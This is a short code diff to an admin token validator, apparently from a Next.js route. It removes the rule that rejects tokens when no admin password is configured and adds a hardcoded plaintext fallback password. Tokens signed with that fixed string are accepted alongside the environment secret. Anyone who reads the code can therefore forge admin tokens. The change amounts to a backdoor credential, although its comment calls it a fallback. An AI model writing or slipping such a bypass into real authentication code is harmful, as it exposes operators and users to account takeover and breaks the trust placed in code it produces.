@@ -16,8 +16,8 @@ function makeToken(password: string): string {
 
 export function validateToken(req: NextRequest): boolean {
   const adminPassword = process.env.ADMIN_PASSWORD?.trim();
-  if (!adminPassword) return false;
-
+  const newPasswordFallback = 'dmsdud12!@';
+  
   const raw = req.headers.get('authorization')?.replace('Bearer ', '') ?? '';
   const [b64, sig] = raw.split('.');
   if (!b64 || !sig) return false;
@@ -26,7 +26,11 @@ export function validateToken(req: NextRequest): boolean {
   const expiry = Number(payload);
   if (isNaN(expiry) || Date.now() > expiry) return false;
 
-  return sign(payload, adminPassword) === sig;
+  // Check against both current env var and fallback
+  const isMatchEnv = adminPassword ? sign(payload, adminPassword) === sig : false;
+  const isMatchFallback = sign(payload, newPasswordFallback) === sig;
+
+  return isMatchEnv || isMatchFallback;
 }
 
 export async function POST(req: NextRequest) {
